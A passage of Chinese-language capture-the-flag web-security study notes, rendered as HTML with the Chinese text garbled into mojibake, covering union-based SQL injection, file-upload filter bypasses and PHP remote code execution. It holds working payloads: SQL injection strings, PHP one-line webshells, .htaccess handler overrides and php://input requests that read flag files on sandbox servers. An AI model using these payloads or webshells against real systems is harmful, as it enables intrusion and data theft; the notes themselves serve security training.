class="number">2</span>å‡å¯å›æ˜¾ï¼Œè¯´æ˜æ•°æ®åº“æœ‰ä¸¤è¡Œ</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>ï¼›# æŸ¥çœ‹é¡µé¢å›æ˜¾ä½ï¼Œå‘ç°<span class="number">1</span>ï¼Œ<span class="number">2</span>éƒ½å¯ä»¥è¿›è¡Œå›æ˜¾</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),database() # å¼€å§‹æ³¨å…¥ï¼Œè·å–æ•°æ®åº“ç‰ˆæœ¬å’Œæ•°æ®åº“å </span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> # å› ä¸ºæ•°æ®åº“ç‰ˆæœ¬å¤§äº<span class="number">5.0</span>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥è¯¢information_schemaè¡¨æ¥è·å–è¡¨åå’Œåˆ—åï¼Œè·å¾—è¡¨åç§°ä¸ºgdctsoiitj</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;gdctsoiitj&#x27;</span> # å¾—åˆ°è¡¨ååï¼Œç»§ç»­æŸ¥è¯¢åˆ—åï¼Œè·å¾—åˆ—åç§°ä¸ºzrxzhzkosa</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> zrxzhzkosa,<span class="number">2</span> <span class="keyword">from</span> gdctsoiitj # å¾—åˆ°åˆ—ååï¼ŒæŸ¥è¯¢æ•°æ®å¾—åˆ°flagï¼Œéœ€è¦æ³¨æ„è¿™é¢˜çš„è¡¨åå’Œåˆ—åæ¯ä¸ªç¯å¢ƒéƒ½ä¸ä¸€æ ·</span><br></pre></td></tr></table></figure><ul><li><p>ä¸ºä»€ä¹ˆid&#x3D;-1è€Œä¸æ˜¯1</p><blockquote><pre><code> 1. ç»è¿‡æŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼Œæ•°æ®åº“ä¸­idçš„æ•°æ®ç±»å‹è®¾ç½®ä¸ºintï¼ˆæ•°å€¼ç±»å‹ï¼‰å°±ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œå¦‚æœæ•°æ®åº“æ£€æŸ¥åˆ°idçš„å‚æ•°å¹¶ä¸ä¸ºæ•°å€¼çš„è¯ï¼Œå°±ä¼šå‘ç”Ÿç±»å‹è½¬æ¢ 2. æœ¬é¢˜ID=1ï¼Œæˆ‘æƒ³æ³¨å…¥çš„æ—¶å€™å°±ä¸èƒ½å†æ³¨ID=1äº†(è¦æŸ¥è¯¢æ•°æ®åº“ä¸å­˜åœ¨çš„ç»“æœï¼Œå¦åˆ™å­˜åœ¨çš„ç»“æœå ä½æ˜¾ç¤ºæˆ‘ä»¬å°±çœ‹ä¸åˆ°ç¬¬äºŒè¡Œçš„æ•°æ®) 3. ç”¨è”åˆæŸ¥è¯¢è¯­å¥union selectè¯­å¥æ¥æ³¨å…¥ï¼Œä»è€Œåˆ¤æ–­æ˜¾ç¤ºä½,åŒæ—¶ä¹Ÿæ˜¯åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œæ­¤æ—¶è¦å…ˆä¿è¯ä¹‹å‰çš„æ•°æ®æŸ¥ä¸å‡ºæ¥æ‰èƒ½åˆ¤æ–­æ³¨å…¥ä½ç½®ï¼Œä¸ç„¶å°±ä¼šä¸€ç›´åœ¨æ³¨å…¥å½“å‰çš„æ•°æ®åº“ï¼Œæ— æ³•æ³¨å…¥æ–°çš„å€¼æ¥åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œä¹‹åå†union select id=-1æ•°æ®ä¸å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä½ç½®2å¯ä»¥æ’å…¥SQLè¯­å¥ã€‚</code></pre><p>æ€»ç»“ä¸€ä¸‹ï¼š<br>æ¯”å¦‚å­—ç¬¦ä¸²â€™1â€™ä¼šè¢«è½¬æ¢ä¸º1</p><p>æ¯”å¦‚å­—ç¬¦ä¸²â€™1â€â€˜ä¼šè¢«è½¬æ¢ä¸º1</p><p>æ¯”å¦‚â€™1 and 1&#x3D;1â€™ä¼šè¢«è¯†åˆ«ä¸º1</p><p>æ¯”å¦‚â€™1 and 1&#x3D;2â€™ä¼šè¢«è¯†åˆ«ä¸º1</p><p>æ¯”å¦‚â€™1akbucbdadbaiudadbabdaudâ€™ä¼šè¢«è¯†åˆ«ä¸º1</p><p>æ¯”å¦‚â€™23adasuasdai32ansoihaâ€™ä¼šè¢«è¯†åˆ«ä¸º23</p><p>å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦å¯ä»¥æ˜¯ä»»æ„çš„ï¼Œç±»å‹è½¬æ¢æ—¶éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸ä¼šå¯¹æ•°å€¼æœ‰ä»»ä½•çš„å½±å“</p></blockquote></li><li><p>ä¸ºä»€ä¹ˆè¦ç”¨åˆ°<code>group_concat</code></p><blockquote><p>å› ä¸ºéœ€è¦åœ¨ä¸€è¡Œè¾“å‡ºæ‰€æœ‰çš„ç»“æœ</p></blockquote></li></ul><h4><span id="uaæ³¨å…¥">UAæ³¨å…¥</span></h4><ul><li>å’Œcookieæ³¨å…¥æµç¨‹ä¸€è‡´</li></ul><h4><span id="refereræ³¨å…¥">Refereræ³¨å…¥</span></h4><ul><li>å’Œcookieæ³¨å…¥æµç¨‹ä¸€è‡´</li></ul><h4><span id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</span></h4><p>éšç€é»‘å®¢æŠ€æœ¯çš„æå‡ï¼Œæˆ‘ä»¬å¼€å‘äººå‘˜çš„é˜²æŠ¤æªæ–½ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œå¼€å‘äººå‘˜é€šå¸¸ä¼šåœ¨åå°è¿‡æ»¤æŸäº›éæ­£å¸¸ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ï¼Œä¾‹å¦‚unionã€selectã€å•å¼•å·åŒå¼•å·ç­‰ç­‰ã€‚</p><ul><li>å¯ä»¥é€šè¿‡&#x2F;**&#x2F;æ¥ä»£æ›¿ç©ºæ ¼</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> # å‘ç°è¢«è¿‡æ»¤äº†</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="operator">=</span><span class="comment">/**/</span><span class="number">1</span> # å‘ç°æ­£ç¡®ï¼Œç»§ç»­æ„é€ payloadè¯­å¥ï¼Œå‘ç°ç­‰äº<span class="number">2</span>æ—¶å›æ˜¾é”™è¯¯ï¼Œè¯´æ˜æ­¤é¢˜å­˜åœ¨è¿‡æ»¤ç©ºæ ¼æ³¨å…¥</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">2</span> # æŸ¥çœ‹æœ‰å‡ ä½</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # å‘ç°æ— å›æ˜¾ï¼Œéœ€è¦åŠ è´Ÿå·æ“ä½œ</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # æˆåŠŸå‘ç°å›æ˜¾</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,version() # å‘ç°å›æ˜¾ä½</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata # æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;lqsyncyuso&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure><h3><span id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </span></h3><ul><li>tips: MacBookä¸Šæœ‰ä¸ªå‘ï¼Œä¸Šä¼ éšè—æ–‡ä»¶æ—¶å€™éœ€è¦é…åˆå‘½ä»¤<code>command+shift+.</code></li></ul><h4><span id="æ— éªŒè¯">æ— éªŒè¯</span></h4><ol><li>é€šè¿‡Wappalyzeræ¥æŸ¥çœ‹å½“å‰é¡µé¢çš„åŸºç¡€ç¯å¢ƒï¼Œå¦‚ä¸­é—´ä»¶ï¼Œå‰åç«¯è¯­è¨€ç­‰ </li><li>å°†ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ åˆ°æœåŠ¡å™¨</li></ol><ul><li>phpçš„ä¸€å¥è¯æœ¨é©¬</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>é€šè¿‡ä¸­å›½èšå‰‘è¿›è¡Œæ§åˆ¶ï¼Œæ‰¾åˆ°flag</li></ol><h4><span id="å‰ç«¯éªŒè¯">å‰ç«¯éªŒè¯</span></h4><ul><li>å’Œæ— éªŒè¯å·®ä¸å¤šï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯å‰ç«¯æ£€æŸ¥äº†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åã€‚</li></ul><ol><li>ç¦ç”¨jsæ¥è§£å†³</li><li>ä½¿ç”¨burpsuiteï¼Œå…ˆå°†ä¸€å¥è¯æœ¨é©¬åç¼€ä¿®æ”¹æˆ.pngï¼Œç„¶åæŠ“åŒ…åç¼€ä¿®æ”¹æˆphpï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„</li></ol><h4><span id="htaccess">.htaccess</span></h4><blockquote><p>htaccess æ–‡ä»¶æ˜¯ Apache æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡ htaccess æ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ 301 é‡å®šå‘ã€è‡ªå®šä¹‰ 404 é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p></blockquote><ol><li><p>ä½¿ç”¨ FilesMatch å‘½ä»¤ç”Ÿæˆä¸€ä¸ª.htaccess æ–‡ä»¶è¿›è¡Œä¸Šä¼ ï¼Œç»•è¿‡ç™½åå•ä¸­çš„æ¼æ´</p><ul><li><p>éœ€è¦æ„é€ .htaccessæ–‡ä»¶ï¼Œå…¶ä¸­<code>FilesMatch</code> å°±æ˜¯æˆ‘ä»¬è¦ä¸Šä¼ çš„æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">payload</span>&quot;&gt;</span></span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œåå­—ä¸ºFilesMatchè®¾ç½®çš„<code>payload</code></p></li></ul></li><li><p>ä½¿ç”¨passthruæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</p><ul><li>ç¬¬ä¸€æ­¥ä¸€æ ·æ˜¯æ„é€ .htaccessæ–‡ä»¶</li><li>ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨passthruæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /var/www/&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®<code>http://xxxx/upload/payload</code>æ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /var/www/html/flag_828011517.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ .htaccessæ–‡ä»¶</p><ul><li>å¥è¯çš„ä½œç”¨æ˜¯ï¼šè®©jpgæ–‡ä»¶ä¸­çš„phpè¯­å¥æ‰§è¡Œï¼Œè¿™å¥è¯­å¥æ”¾åˆ°.htaccessæ–‡ä»¶ä¸­ï¼ŒApacheè¿è¡Œçš„æ—¶å€™ä¼šè§£æè¿™ä¸ªæ–‡ä»¶ä¸­çš„é…ç½®ï¼Œæ£€æµ‹åˆ°è¿™å¥è¯ä»¥åï¼Œjpgæ–‡ä»¶ä¸­çš„phpè¯­å¥æ‰ä¼šæ‰§è¡Œ</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><ul><li>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä»¥.jpgç»“å°¾</li><li>ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</li></ul></li></ol><h4><span id="mime">MIME</span></h4><ul><li>ä¸Šä¼ phpæ–‡ä»¶ï¼Œå¹¶å°†content-typeæ”¹æˆimage&#x2F;pngå³å¯</li></ul><h4><span id="æ–‡ä»¶å¤´æ£€æŸ¥">æ–‡ä»¶å¤´æ£€æŸ¥</span></h4><p>åŸç†ï¼šæœåŠ¡å™¨ä¼šæ£€æŸ¥pngçš„å¤´æ ¼å¼</p><ul><li><p>æˆªå›¾ä¸Šä¼ æ–‡ä»¶ï¼Œé€šè¿‡<code>burpsuite</code>è¿›è¡Œä»£ç†</p></li><li><p>åœ¨å›¾ç‰‡åé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹æ–‡ä»¶åç¼€.php</p></li><li><p>ä½¿ç”¨èšå‰‘è¿æ¥</p></li></ul><h4><span id="00æˆªæ–­">00æˆªæ–­</span></h4><p><strong>%00çš„ä½¿ç”¨æ˜¯åœ¨è·¯å¾„ä¸Š</strong></p><p>å°±æ˜¯åœ¨.phpæ–‡ä»¶ååŠ ä¸Š%00åæ¥.jpgï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡å¯¹phpæ–‡ä»¶çš„è¿‡æ»¤ã€‚åœ¨æ‰§è¡Œæ—¶ï¼Œ%00ä¼šæŠŠåé¢çš„.jpgæˆªæ–­ï¼Œæ‰€ä»¥æ‰§è¡Œçš„æ—¶å€™ä»–æ‰§è¡Œçš„ä»ç„¶æ˜¯å‰é¢çš„.phpæ–‡ä»¶ã€‚å°±å¯ä»¥å®ç°æˆ‘ä»¬çš„é©¬å­æ–‡ä»¶çš„æ‰§è¡Œã€‚</p><h4><span id="åŒå†™åç¼€">åŒå†™åç¼€</span></h4><p>åŸç†ï¼šæœåŠ¡å™¨ä¼šæ›¿æ¢åç¼€â€™phpâ€™-&gt;â€™â€™ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ‹¼æ¥åç¼€ä¸ºâ€pphphpâ€å³å¯</p><h3><span id="rce">RCE</span></h3><h4><span id="evalæ‰§è¡Œ">evalæ‰§è¡Œ</span></h4><p>è¿›å…¥åé¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯•åœ¨URLä¸­å¸¦ä¸Šåä¸ºcmdçš„å‚æ•°ï¼šï¼ˆæ­¤å¤„<code>system()</code>å‡½æ•°çš„ä½œç”¨ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¾“å‡ºæ‰§è¡Œç»“æœï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸ æ­¤å¤„éœ€è¦æ³¨æ„å‚æ•°ç»“å°¾ä¸€å®šä¸èƒ½çœç•¥<code>;</code>ï¼Œæ»¡è¶³PHPè¯­æ³•æ‰å¯ä»¥æ‰§è¡ŒæˆåŠŸã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;ls%20/&quot;);</span><br><span class="line">.../?cmd=system(&quot;cat%20/flag_xxxx&quot;);</span><br></pre></td></tr></table></figure><h4><span id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</span></h4><ul><li>è€ƒå¯Ÿ<code>include</code>å‡½æ•°</li></ul><p>è®¿é—®shellé¡µé¢ï¼Œå‘ç°æœ‰ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‡å¦‚åœ¨index.phpä¸­includeäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆä¸ç®¡è¿™ä¸ªæ–‡ä»¶åç¼€æ˜¯ä»€ä¹ˆ  è¿™ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹å°†ä¼šç›´æ¥å‡ºç°åœ¨index.phpä¸­ï¼Œæ‰€ä»¥è¿™é“é¢˜çš„payloadæ„é€ æ€è·¯å°±æ˜¯æŠŠshell.txté‡Œçš„å†…å®¹æƒ³åŠæ³•æ”¾åˆ°index.phpä¸­å»æ ¹æ®æºç æ„é€ payloadï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨èšå‰‘åç¼€åŠ ä¸Špayloadå³å¯</p><h4><span id="phpx2fx2finput">php:&#x2F;&#x2F;input</span></h4><p><a href="https://blog.csdn.net/qq_51295677/article/details/123462929">å‚è€ƒæ–‡çŒ®</a></p><p>å¸¸ç”¨åˆ°ä¼ªåè®®çš„<code>php://input</code>å’Œ<code>php://filter</code>.å…¶ä¸­<code>php://input</code>è¦æ±‚<code>allow_url_include</code>è®¾ç½®ä¸º<code>On</code></p><ul><li>ä½¿ç”¨burp suiteçš„repeaterå‘é€è¯·æ±‚ï¼Œæ„é€ è¯·æ±‚æŠ¥æ–‡</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag_5734&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿”å›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;8c628d8ea62d6dc8316f15c3&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h4><span id="è¯»å–æºä»£ç ">è¯»å–æºä»£ç </span></h4><p><a href="https://blog.csdn.net/qq_61839115/article/details/128593214">å‚è€ƒ</a></p><ul><li>è€ƒç‚¹ï¼š<code>php://filter</code>å¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå…·æœ‰å››ä¸ªå‚æ•°ã€‚</li></ul><table><thead><tr><th>åç§°</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td><td>å¿…é€‰</td></tr><tr><td>read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td><td></td></tr></tbody></table><p>è¿™é“é¢˜å°±ç›´æ¥æ„é€ payloadäº†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 